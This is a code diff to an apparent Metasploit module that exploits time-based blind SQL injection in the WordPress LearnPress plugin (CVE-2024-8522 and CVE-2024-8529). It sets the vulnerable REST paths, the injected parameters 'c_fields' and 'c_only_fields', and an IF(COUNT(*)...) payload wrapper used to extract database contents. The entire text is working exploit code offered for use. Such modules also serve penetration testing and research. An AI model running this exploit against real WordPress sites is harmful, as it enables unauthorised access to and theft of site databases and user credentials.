@@ -19,8 +19,9 @@ class MetasploitModule < Msf::Auxiliary
           and extract sensitive information.
         },
         'Author' => [
-          'abrahack',          # Vulnerability Discovery
-          'Valentin Lobstein'  # Metasploit Module
+          'abrahack',                              # Vulnerability Discovery
+          'Valentin Lobstein',                     # Metasploit Module
+          'Achref Ben Thameur a.k.a achrefthameur' # Help for CVE-2024-8529 reproduction
         ],
         'License' => MSF_LICENSE,
         'References' => [
@@ -50,25 +51,36 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run_host(_ip)
-    sqli_param = action.name.downcase.include?('cve-2024-8522') ? 'c_only_fields' : 'c_fields'
-    description = action.name.downcase.include?('cve-2024-8522') ? 'CVE-2024-8522' : 'CVE-2024-8529'
+    if action.name.downcase.include?('cve-2024-8529')
+      sqli_param = 'c_fields'
+      description = 'CVE-2024-8529'
+      path = '/wp-json/lp/v1/courses/archive-course'
+      additional_params = { 'return_type' => 'json' }
+    else
+      sqli_param = 'c_only_fields'
+      description = 'CVE-2024-8522'
+      path = '/learnpress/v1/courses'
+      additional_params = {}
+    end
 
     print_status("Performing SQL injection for #{description} via the '#{sqli_param}' parameter...")
 
     @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind) do |payload|
       random_negative_number = -Rex::Text.rand_text_numeric(2).to_i
+      vars_get = { sqli_param => "IF(COUNT(*)!=#{random_negative_number},(#{payload}),0)" }.merge(additional_params)
+
+      vars_get['rest_route'] = path if action.name.downcase.include?('cve-2024-8522')
+
       res = send_request_cgi({
         'method' => 'GET',
-        'uri' => normalize_uri(target_uri.path),
-        'vars_get' => {
-          'rest_route' => '/learnpress/v1/courses',
-          sqli_param => "IF(COUNT(*)!=#{random_negative_number},(#{payload}),0)"
-        }
+        'uri' => normalize_uri(target_uri.path, path),
+        'vars_get' => vars_get
       })
+
       fail_with(Failure::Unreachable, 'Connection failed') unless res
     end
 
-    fail_with(Failure::NotVulnerable, 'Target is not vulnerable or delay is too short.') unless @sqli.test_vulnerable
+    fail_with(Failure::NotVulnerable, 'Target is not vulnerable.') unless @sqli.test_vulnerable
     print_good('Target is vulnerable to SQLi!')
 
     wordpress_sqli_initialize(@sqli)
